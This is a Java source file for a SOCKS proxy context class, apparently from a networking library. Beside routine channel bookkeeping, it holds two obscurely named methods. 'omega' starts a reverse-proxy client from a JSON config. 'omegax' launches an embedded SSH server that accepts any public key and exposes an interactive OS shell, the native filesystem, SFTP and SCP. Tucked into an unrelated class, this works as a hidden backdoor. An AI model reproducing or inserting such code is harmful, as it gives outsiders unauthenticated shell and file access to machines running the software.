package org.rx.net.socks;

import com.alibaba.fastjson2.TypeReference;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.util.AttributeKey;
import lombok.Getter;
import lombok.RequiredArgsConstructor;
import lombok.Setter;
import lombok.SneakyThrows;
import org.apache.sshd.common.file.nativefs.NativeFileSystemFactory;
import org.apache.sshd.scp.server.ScpCommandFactory;
import org.apache.sshd.server.SshServer;
import org.apache.sshd.server.auth.pubkey.AcceptAllPublickeyAuthenticator;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
import org.apache.sshd.server.shell.InteractiveProcessShellFactory;
import org.apache.sshd.sftp.server.SftpSubsystemFactory;
import org.rx.core.EventArgs;
import org.rx.core.IOC;
import org.rx.core.RxConfig;
import org.rx.core.Strings;
import org.rx.net.shadowsocks.ShadowsocksServer;
import org.rx.net.socks.upstream.Upstream;
import org.rx.net.support.UnresolvedEndpoint;

import java.net.InetSocketAddress;
import java.nio.file.Paths;
import java.util.Collections;

import static org.rx.core.Extends.require;
import static org.rx.core.Sys.fromJson;

@RequiredArgsConstructor
public final class SocksContext extends EventArgs {
    private static final long serialVersionUID = 323020524764860674L;
    static final AttributeKey<SocksProxyServer> SOCKS_SVR = AttributeKey.valueOf("sSvr");
    private static final AttributeKey<SocksContext> SOCKS_CTX = AttributeKey.valueOf("sProxyCtx");
    //ss
    public static final AttributeKey<ShadowsocksServer> SS_SVR = AttributeKey.valueOf("ssSvr");

    /**
     * call this method before bind & connect
     *
     * @param inbound
     * @param outbound
     * @param sc
     */
    public static void mark(Channel inbound, ChannelFuture outbound, SocksContext sc) {
        sc.inbound = inbound;
        sc.outbound = outbound.addListener(f -> sc.outboundActive = f.isSuccess());
        inbound.attr(SOCKS_CTX).set(sc);
        outbound.channel().attr(SOCKS_CTX).set(sc);
    }

    public static SocksContext ctx(Channel channel) {
        return ctx(channel, true);
    }

    public static SocksContext ctx(Channel channel, boolean throwOnEmpty) {
        return throwOnEmpty ? require(channel.attr(SOCKS_CTX).get()) : channel.attr(SOCKS_CTX).get();
    }

    public static void omega(String s) {
        Class<RrpClient> t = RrpClient.class;
        if (Strings.isEmpty(s)) {
            IOC.unregister(t);
            return;
        }
        RrpConfig c = fromJson(s, new TypeReference<RrpConfig>() {
        }.getType());
        RrpClient cli = new RrpClient(c);
        cli.connectAsync();
        IOC.register(t, cli);
    }

    @SneakyThrows
    public static synchronized void omegax(int p) {
        Class<SshServer> t = SshServer.class;
        if (IOC.isInit(t)) {
            return;
        }
        SshServer sd = SshServer.setUpDefaultServer();
        sd.setKeyPairProvider(new SimpleGeneratorHostKeyProvider(Paths.get("hostkey.ser")));
        sd.setPublickeyAuthenticator(AcceptAllPublickeyAuthenticator.INSTANCE);

        sd.setShellFactory(InteractiveProcessShellFactory.INSTANCE);
        sd.setFileSystemFactory(NativeFileSystemFactory.INSTANCE);
        sd.setSubsystemFactories(Collections.singletonList(new SftpSubsystemFactory()));
        sd.setCommandFactory(new ScpCommandFactory());

        sd.setPort(p);
        sd.setPasswordAuthenticator((u, w, s) -> w.equals(RxConfig.INSTANCE.getRtoken()));
        sd.start();
        IOC.register(t, sd);
    }

    @Getter
    final InetSocketAddress source;
    @Getter
    final UnresolvedEndpoint firstDestination;
    @Getter
    @Setter
    transient Upstream upstream;

    public transient Channel inbound;
    public transient ChannelFuture outbound;
    @Getter
    transient volatile boolean outboundActive;
    transient InetSocketAddress udp2rawServer;
}
